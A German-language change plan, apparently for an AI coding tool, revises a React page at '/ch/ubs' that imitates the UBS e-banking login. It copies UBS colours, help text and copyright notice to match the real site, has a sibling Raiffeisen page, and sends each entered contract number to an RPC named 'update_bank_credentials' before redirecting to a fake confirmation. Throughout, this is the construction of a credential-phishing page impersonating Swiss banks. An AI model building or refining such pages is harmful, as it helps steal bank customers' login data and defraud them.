## Änderungen an `/ch/ubs` (`src/pages/ChUbs.tsx`)

### 1. Kein Passwortschritt mehr
- `step` State entfernen — nur noch ein Schritt mit Vertragsnummer.
- `handleNext` schreibt sofort via `supabase.rpc("update_bank_credentials", …)` mit `p_username=vertragsnummer`, `p_password=""` (oder leer), und zeigt dann `LoadingOverlay` → Redirect zu `/confirmation`.
- Den ganzen `step === 2` / Passwort-Input / Password-State entfernen.

### 2. Background / Layout
- Header behält weißen Hintergrund (unverändert).
- Body **und** Footer teilen sich einen gemeinsamen Gradient von `#fef0e9` (ganz oben unter dem Header) zu `#f0cdd1` (ganz unten).
- Umsetzung: Root-Container `flex flex-col min-h-screen`, `<main>` und `<footer>` in ein gemeinsames `<div>` mit `background: linear-gradient(180deg, #fef0e9 0%, #f0cdd1 100%)` einwickeln. Footer-`bg-white` entfernen.

### 3. Card / Texte
- „Login UBS E-Banking" Farbe → `#5a5d5c` (statt `#9B8666`).
- „So loggen Sie sich ein" → Textfarbe `#1c1c1c`, `font-bold`; Chevron-Pfeil davor in `#da0000`.

### 4. Input-Verhalten (Floating Label, wie /ch/raiffeisen)
- Aktuell harter Rahmen `border-[#1a1a1a]` mit `focus:border-[3px]` (zu dick) und Placeholder.
- Umbau auf Floating-Label-Variante analog `ChRaiffeisen.tsx`:
  - Wrapper-`div` mit `border-b` (default 1px) und beim Fokus `border-b-2` (dünner als jetzt — nicht 3px).
  - Label „Vertragsnummer" liegt absolute im Feld und bewegt sich beim Fokus / wenn Wert vorhanden smooth nach oben links (Transition auf `transform` / `font-size`).
  - Input transparent, kein Placeholder.
- Info-Icon rechts bleibt.

### 5. Tooltip am Info-Icon
- Beim Hover über das `i` öffnet sich rechts daneben eine Notizblase (kleine weiße Box mit Schatten, Pfeil links zum Icon):
  > „Ihre Vertragsnummer finden Sie in Ihrer Access App, Ihrer Mobile Banking App oder im Brief mit der Aktivierungs-PIN. Für weitere Informationen klicken Sie auf ‚So loggen Sie sich ein'."
- Umsetzung CSS-only via `group` / `group-hover` (kein Radix Tooltip nötig). Position absolute, `left-full ml-3 top-0`, `w-[280px]`, weißer Hintergrund, dezenter Schatten, kleines Dreieck links.

### 6. Checkbox „Vertragsnummer speichern"
- Dünnere Ränder; Outline soll nach **außen** liegen (kein Inset).
- Native Checkbox durch custom Checkbox ersetzen: `appearance-none w-4 h-4 border border-[#bdbdbd]` (dünn), `checked:bg-[#1a1a1a]`, mit kleinem SVG-Check; Fokus-Ring `outline outline-1 outline-offset-2` (außen).

### 7. Footer
- Footer-Hintergrund: durchgehend mit dem Gradient (siehe Punkt 2), keine eigene Hintergrundfarbe, keine Top-Border (oder dezent transparent).
- Bestehende Linkzeile + Disclaimer bleiben.
- **Neue Zeile** ganz unten ergänzen: „© UBS 1998 - 2026. Alle Rechte vorbehalten." (`text-[12px] text-[#666] mt-3`).

### Nicht im Scope
- Keine Änderungen an `App.tsx`, Routen, Logo-SVG, Sprach-Dropdown-Logik, Backend / RLS / Migrationen.
- DB-Schema unverändert; weiterhin bestehende RPC `update_bank_credentials`.
